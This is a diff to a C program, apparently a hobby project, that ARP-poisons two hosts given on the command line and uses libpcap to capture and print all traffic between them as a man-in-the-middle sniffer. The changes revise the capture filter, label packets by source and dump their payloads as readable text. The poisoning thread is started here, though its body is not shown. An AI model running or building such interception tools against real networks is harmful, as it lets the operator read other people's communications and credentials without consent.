@@ -3,6 +3,8 @@
 #include "header/hacking.h"
 #include <unistd.h>
 #include <pthread.h>
+#include <netinet/ether.h>
+
 
 void set_packet_filter(pcap_t *handle, char *filter_opt);
 
@@ -54,11 +56,12 @@ int main(int argc, char *argv[])
     uint8_t *target1_mac;
     uint8_t *target2_mac;
 
-    // TCP Connection
+    // Connection
     const u_char *packet;
     const u_char *data;
     char filter_str[200];
-    const struct libnet_tcp_hdr *current_connection;
+    const struct libnet_tcp_hdr *tcp_header;
+    const struct libnet_ipv4_hdr *ip_header;
 
     // Multithreading
     struct data_pass poison_data;
@@ -91,7 +94,7 @@ int main(int argc, char *argv[])
     
 
      /* Open device for live capture */
-     handle = pcap_open_live(ift->name, 4096, 1, 100, errbuf);
+     handle = pcap_open_live(ift->name, 4096, 1, 200, errbuf);
      if(handle == NULL)
         fatal("opening live session");
     
@@ -103,11 +106,11 @@ int main(int argc, char *argv[])
     set_packet_filter(handle, "arp");
     
     // Request Target 1
-    printf("\nZiel \033[32m#1\033[39m: sende ARP-requests... \n");
+    printf("\nZiel \033[32m%s\033[39m: sende ARP-requests... \n", argv[1]);
     arp_request(target1_ip, l);
 
     // Receive Target 1
-    printf("Ziel \033[32m#1\033[39m: suche nach ARP-replys...\n");
+    printf("Ziel \033[32m%s\033[39m: suche nach ARP-replys...\n", argv[1]);
 
     /* Loop goes on until a matching ARP-reply is found */
 
@@ -116,11 +119,11 @@ int main(int argc, char *argv[])
     printf("\n-------------------------------\n\n");
 
     // Request Target 2
-    printf("Ziel \033[34m#2\033[39m: sende ARP-requests... \n");
+    printf("Ziel \033[34m%s\033[39m: sende ARP-requests... \n", argv[2]);
     arp_request(target2_ip, l);
 
     // Receive Target 2
-    printf("Ziel \033[34m#2\033[39m: suche nach ARP-replys...\n");
+    printf("Ziel \033[34m%s\033[39m: suche nach ARP-replys...\n", argv[2]);
     // while(arp_receive(handle, target2_ip, target2_mac) != 0) {sleep(1); arp_request(target2_ip, l);}
 
     /* 
@@ -139,30 +142,48 @@ int main(int argc, char *argv[])
     pthread_create(&t_poison, NULL, arp_poison_thread, &poison_data);
 
     // make filter for tcp
-    strcpy(filter_str, "tcp and (dst host ");
+    strcpy(filter_str, "(src host ");
     strcat(filter_str, argv[1]);
-    strcat(filter_str, " or dst host ");
+    strcat(filter_str, " or dst host "); 
     strcat(filter_str, argv[2]);
     strcat(filter_str, ") and (src host ");
     strcat(filter_str, argv[1]);
     strcat(filter_str, " or src host ");
     strcat(filter_str, argv[2]);
     strcat(filter_str, ")");
-    
     // Set packet filter for TCP
     set_packet_filter(handle, filter_str);
-    set_packet_filter(handle, "tcp");
+    //set_packet_filter(handle, "tcp"); // just for testing
 
     // main loop intercepting packets and displaying them
     while(1)
     {
         packet = pcap_next(handle, &pkthdr);
         printf("got %d bytes packet\n", pkthdr.len);
-        current_connection = packet + LIBNET_ETH_H + LIBNET_IPV4_H;
-        data = current_connection + LIBNET_TCP_H;
-        printf("Port is %d, message could be %s\n",ntohs(current_connection->th_dport), data + 2);
-        printf(data);
+        ip_header = packet + ETHER_HDR_LEN + 2; // no idea why it is off by 2
+        tcp_header = packet + LIBNET_ETH_H + LIBNET_IPV4_H;
+        if(pkthdr.len == 0) continue;
+
+        // Print if it came from Target 1 or 2
+        
+        if(ip_header->ip_src.s_addr == target1_ip)
+            printf("\033[32m%s\033[39m", argv[1]);
+    
+        if(ip_header->ip_src.s_addr == target2_ip)
+            printf("\033[34m%s\033[39m", argv[2]);
+
+        
         fflush(stdout);
+            
+        for(int i = 0; i < pkthdr.len; i++)
+        {
+            if(*(packet + i) < 31 || *(packet + i) > 127) // non printable characters
+                printf(".");
+            else
+                printf("%c", *(packet + i));
+        }
+        printf("\n");
+        //fflush(stdout);
     }
     
 }
